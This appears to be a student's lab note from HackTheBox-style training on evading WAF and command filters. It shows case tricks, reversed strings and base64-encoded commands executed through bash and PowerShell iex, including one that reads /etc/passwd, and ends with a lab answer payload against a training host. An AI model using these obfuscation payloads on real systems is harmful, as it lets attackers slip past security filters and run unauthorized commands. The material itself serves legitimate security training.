---
title: e-Advanced Command Obfuscation
draft: false
tags:
---
When dealing with advanced filtering solutions such as WAF, basic evasion technique may not work.

## Case Manipulation

e.g

`WHOAMI` , `WhOaMi`

This usually works because command blacklist may not check for different case variations.

> This won't work in Linux since Linux commands are case sensitive

```powershell-session
PS C:\htb> WhOaMi

21y4d
```

On Linux, we have to use the following method to turn the command into an all-lowercase word:

```shell-session
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

We can use command like below as well:

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

## Reversed Commands

Have a command template that switched reversed command back to normal.

e.g

Write `imaohw` to execute `whoami`.

First we have to get the reversed string of our command as follows:


```shell-session
jadu101@htb[/htb]$ echo 'whoami' | rev
imaohw
```

We can execute the original command by reversing it back using a sub-shell (`$()`).

```shell-session
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d
```

On Windows, we can reverse string as such:

```powershell-session
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```

We can now use the below command to execute a reversed string with a PowerShell sub-shell (`iex "$()"`), as follows:

```powershell-session
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

## Encoded Commands

We can utilize various encoding tools, like base64 and xxd.

e.g base64

```shell-session
jadu101@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Now we can create a command that will decode the encoded string in a sub-shell (`$()`), and then pass it to `bash` to be executed (i.e. `bash<<<`), as follows:

```shell-session
jadu101@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

On Windows,

```powershell-session
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

We may also achieve the same thing on Linux, but we would have to convert the string from `utf-8` to `utf-16` before we `base64` it, as follows:

```shell-session
jadu101@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```

Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (`iex "$()"`), as follows:

```powershell-session
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```

In addition to the techniques we discussed, we can utilize numerous other methods, like wildcards, regex, output redirection, integer expansion, and many others. We can find some such techniques on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion).

```
Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1

94.237.59.67:40560

bash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

